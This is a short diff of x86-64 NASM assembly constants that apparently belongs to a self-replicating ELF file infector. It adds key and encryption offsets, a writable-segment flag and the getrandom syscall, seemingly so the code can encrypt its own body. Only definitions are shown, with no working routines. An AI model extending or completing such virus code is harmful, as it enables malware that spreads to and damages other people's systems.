@@ -1,6 +1,10 @@
 %define PROG_SIZE   _end - main
 %define JMP_OFFSET  jump - main
 %define SIGNATURE_SIZE _end - signature
+%define KEY_SIZE      signature - key
+%define KEY_OFFSET    key - main
+%define ENCRYPT_SIZE key - encrypted_start - 1
+%define ENCRYPT_OFFSET encrypted_start - main
 %define READ_DIR_BUFF_SIZE  256
 %define PATH_BUFF_SIZE      1024
 
@@ -13,8 +17,10 @@
 %define MAP_SHARED  1
 %define PT_LOAD	    1
 %define PF_X        1
+%define PF_W        2
 %define DT_DIR 4
 %define DT_REG 8
+%define GRND_RANDOM 2
 
 %define SYS_WRITE   1
 %define SYS_OPEN    2
@@ -24,6 +30,7 @@
 %define SYS_MUNMAP  11
 %define SYS_EXIT    60
 %define SYS_GETDENTS 78
+%define SYS_GETRANDOM 318
 
 struc   Elf64_Ehdr
     e_ident:     resb 16   ;       /* Magic number and other info */
